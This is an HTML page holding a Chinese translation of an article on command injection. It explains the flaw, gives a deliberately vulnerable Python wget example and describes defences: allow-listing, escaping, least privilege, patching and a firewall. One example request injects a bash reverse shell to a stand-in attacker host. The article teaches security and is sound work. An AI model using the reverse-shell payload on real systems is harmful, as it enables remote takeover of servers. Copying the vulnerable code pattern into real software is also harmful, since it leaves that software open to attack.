<html>
<head>
<title>Learn About Command Injection Attacks</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">了解命令注入攻击</h1>
<blockquote>原文：<a href="https://betterprogramming.pub/learn-about-command-injection-attacks-1cd0d178fe65?source=collection_archive---------8-----------------------#2020-12-02">https://betterprogramming.pub/learn-about-command-injection-attacks-1cd0d178fe65?source=collection_archive---------8-----------------------#2020-12-02</a></blockquote><div><div class="fc ih ii ij ik il"/><div class="im in io ip iq"><div class=""/><div class=""><h2 id="ac56" class="pw-subtitle-paragraph jq is it bd b jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh dk translated">当攻击者可以在您的机器上执行他们的代码时</h2></div><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="ko kp di kq bf kr"><div class="gh gi ki"><img src="../Images/81c0186691c8a85c09018f1b02d2f904.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*cLjEWklYG1EvGsw3"/></div></div><p class="ku kv gj gh gi kw kx bd b be z dk translated">由<a class="ae ky" href="https://unsplash.com/@hidd3n?utm_source=medium&amp;utm_medium=referral" rel="noopener ugc nofollow" target="_blank">凯文·霍尔瓦特</a>在<a class="ae ky" href="https://unsplash.com?utm_source=medium&amp;utm_medium=referral" rel="noopener ugc nofollow" target="_blank"> Unsplash </a>上拍摄</p></figure><p id="3606" class="pw-post-body-paragraph kz la it lb b lc ld ju le lf lg jx lh li lj lk ll lm ln lo lp lq lr ls lt lu im bi translated">远程代码执行漏洞是当攻击者能够在您的机器上执行他们的代码时发生的一类漏洞。发生这种情况的方式之一是通过命令注入漏洞。它们是一种远程代码执行，当用户输入直接连接到系统命令时就会发生。</p><p id="0643" class="pw-post-body-paragraph kz la it lb b lc ld ju le lf lg jx lh li lj lk ll lm ln lo lp lq lr ls lt lu im bi translated">假设您的网站有一项功能，允许用户下载远程文件并在您的网站上查看。为了实现这个功能，您的应用程序使用系统命令<code class="fe lv lw lx ly b">wget</code>来下载远程文件。</p><p id="595b" class="pw-post-body-paragraph kz la it lb b lc ld ju le lf lg jx lh li lj lk ll lm ln lo lp lq lr ls lt lu im bi translated">这就是你的python源代码的样子。<code class="fe lv lw lx ly b">os.system()</code> Python函数将其输入字符串作为系统命令执行。</p><pre class="kj kk kl km gt lz ly ma mb aw mc bi"><span id="b83b" class="md me it ly b gy mf mg l mh mi">import os</span><span id="f62a" class="md me it ly b gy mj mg l mh mi">def download(url):<br/>  os.system(“wget -O- {}”.format(url))</span><span id="7b0f" class="md me it ly b gy mj mg l mh mi">display(download(user_input.url))</span></pre><p id="725b" class="pw-post-body-paragraph kz la it lb b lc ld ju le lf lg jx lh li lj lk ll lm ln lo lp lq lr ls lt lu im bi translated">Wget是一个给定URL下载网页的工具，<code class="fe lv lw lx ly b">-O-</code>选项让Wget下载文件并在标准输出中显示。所以这个程序从用户输入中获取一个URL，并将其传递给使用<code class="fe lv lw lx ly b">os.system()</code>执行的Wget命令。例如，如果你提交这个请求，应用程序将下载Google主页的源代码并显示给你。</p><pre class="kj kk kl km gt lz ly ma mb aw mc bi"><span id="9c51" class="md me it ly b gy mf mg l mh mi">GET /download?url=google.com<br/>Host: example.com</span></pre><p id="5cff" class="pw-post-body-paragraph kz la it lb b lc ld ju le lf lg jx lh li lj lk ll lm ln lo lp lq lr ls lt lu im bi translated">在这种情况下，系统命令变成:</p><pre class="kj kk kl km gt lz ly ma mb aw mc bi"><span id="d05b" class="md me it ly b gy mf mg l mh mi">wget -O- google.com</span></pre><p id="7f33" class="pw-post-body-paragraph kz la it lb b lc ld ju le lf lg jx lh li lj lk ll lm ln lo lp lq lr ls lt lu im bi translated">在Linux命令行中，分号“；”字符可以用来分隔各个命令。攻击者可以在Wget命令后执行任意命令，方法是在分号“；”后提交他们想要的任何命令人品！该输入将导致应用程序在端口8080上生成一个返回攻击者IP的反向外壳。</p><pre class="kj kk kl km gt lz ly ma mb aw mc bi"><span id="db1f" class="md me it ly b gy mf mg l mh mi">GET /download?url=”google.com;bash -i &gt;&amp; /dev/tcp/attacker_ip/8080 0&gt;&amp;1"<br/>Host: example.com</span></pre><p id="7d58" class="pw-post-body-paragraph kz la it lb b lc ld ju le lf lg jx lh li lj lk ll lm ln lo lp lq lr ls lt lu im bi translated">在这种情况下，系统命令变成:</p><pre class="kj kk kl km gt lz ly ma mb aw mc bi"><span id="af77" class="md me it ly b gy mf mg l mh mi">wget -O- google.com;bash -i &gt;&amp; /dev/tcp/attacker_ip/8080 0&gt;&amp;1</span></pre><p id="e523" class="pw-post-body-paragraph kz la it lb b lc ld ju le lf lg jx lh li lj lk ll lm ln lo lp lq lr ls lt lu im bi translated">反向外壳使目标服务器与攻击者的机器通信，并建立可远程访问的用户界面，使得攻击者能够执行任何系统命令。</p></div><div class="ab cl mk ml hx mm" role="separator"><span class="mn bw bk mo mp mq"/><span class="mn bw bk mo mp mq"/><span class="mn bw bk mo mp"/></div><div class="im in io ip iq"><h1 id="8981" class="mr me it bd ms mt mu mv mw mx my mz na jz nb ka nc kc nd kd ne kf nf kg ng nh bi translated"><strong class="ak">防止命令注入</strong></h1><p id="d73d" class="pw-post-body-paragraph kz la it lb b lc ni ju le lf nj jx lh li nk lk ll lm nl lo lp lq nm ls lt lu im bi translated">如您所见，命令注入会导致您的应用程序和运行web服务器的用户帐户完全受损。如何防止这些危险的漏洞？</p><p id="36f6" class="pw-post-body-paragraph kz la it lb b lc ld ju le lf lg jx lh li lj lk ll lm ln lo lp lq lr ls lt lu im bi translated">首先，您可以通过不使用用户提供的输入运行系统命令来防止命令注入。如果您需要在系统命令中使用用户输入，请避免直接调用操作系统命令。相反，您可以尝试使用具有相同用途的内置库函数。例如，不使用<code class="fe lv lw lx ly b">os.system(“mkdir /dir_name”)</code>，可以使用python OS库中的<code class="fe lv lw lx ly b">os.mkdir(“/dir_name”)</code>。由于用户输入可以通过应用程序解析的文件传递到评估的代码中，因此您应该将用户上传的文件视为不可信文件，并保护程序执行、解析或包含的现有系统文件的完整性。</p><p id="f0e7" class="pw-post-body-paragraph kz la it lb b lc ld ju le lf lg jx lh li lj lk ll lm ln lo lp lq lr ls lt lu im bi translated">或者，您可以为传递给命令的输入实现强输入验证。最好的方法是通过白名单。您可以将字符串或允许的字符列入白名单。例如，当您希望用户能够执行任意命令时，您可以将允许用户运行的命令列入白名单，例如<code class="fe lv lw lx ly b">ls</code>和<code class="fe lv lw lx ly b">pwd</code>，并且只允许那些输入字符串。</p><p id="fca7" class="pw-post-body-paragraph kz la it lb b lc ld ju le lf lg jx lh li lj lk ll lm ln lo lp lq lr ls lt lu im bi translated">当这不可能时，您可以将允许的字符列入白名单。例如，这个正则表达式只允许小写字母和数字，不允许任何可用于操作命令逻辑的特殊字符。输入字符串的长度也被限制为1-10个字符。</p><pre class="kj kk kl km gt lz ly ma mb aw mc bi"><span id="9193" class="md me it ly b gy mf mg l mh mi">^[a-z0–9]{1,10}$</span></pre><p id="d483" class="pw-post-body-paragraph kz la it lb b lc ld ju le lf lg jx lh li lj lk ll lm ln lo lp lq lr ls lt lu im bi translated">最后，您也可以对插入到OS命令中的值进行转义。例如，应该转义的一些危险字符包括:</p><pre class="kj kk kl km gt lz ly ma mb aw mc bi"><span id="9b19" class="md me it ly b gy mf mg l mh mi">&amp; | ; $ &gt; &lt; ` \ !</span></pre><p id="b814" class="pw-post-body-paragraph kz la it lb b lc ld ju le lf lg jx lh li lj lk ll lm ln lo lp lq lr ls lt lu im bi translated">但这通常不太有效，因为攻击者不断想出创新的方法来绕过基于黑名单的输入验证。</p><p id="e8b4" class="pw-post-body-paragraph kz la it lb b lc ld ju le lf lg jx lh li lj lk ll lm ln lo lp lq lr ls lt lu im bi translated">如果所有其他方法都失败了，并且攻击者确实在您的机器上实现了命令注入，那么您如何才能将他们可能造成的危害最小化呢？在系统上运行任意命令意味着几乎可以完全访问该应用程序的权限。因此，如果您限制您的应用程序在您的系统上可以做什么，使用该应用程序的单个命令注入将不会对您的系统造成严重损害。</p><p id="f60a" class="pw-post-body-paragraph kz la it lb b lc ld ju le lf lg jx lh li lj lk ll lm ln lo lp lq lr ls lt lu im bi translated">“最小特权原则”规定，应用程序和进程只应被授予完成其任务所需的特权。这是降低攻击过程中系统受损风险的最佳做法，因为攻击者不会获得敏感文件和操作的访问权限，即使他们损害了低特权用户或进程。例如，当web应用程序只需要对文件进行读取访问时，就不应该授予它任何写入或执行权限。因为如果攻击者劫持了以高特权运行的应用程序，攻击者就可以获得它的权限。在这种情况下，您应该限制运行web服务器的用户的权限，这样攻击者就不能使用它来危害整个系统。</p><p id="8938" class="pw-post-body-paragraph kz la it lb b lc ld ju le lf lg jx lh li lj lk ll lm ln lo lp lq lr ls lt lu im bi translated">最后，您应该及时更新补丁，以防止应用程序的依赖关系引入命令注入漏洞。您还可以部署web应用程序防火墙(WAF)来阻止可疑的攻击。</p><p id="0184" class="pw-post-body-paragraph kz la it lb b lc ld ju le lf lg jx lh li lj lk ll lm ln lo lp lq lr ls lt lu im bi translated">今天的安全课到此结束！下次见！</p></div></div>    
</body>
</html>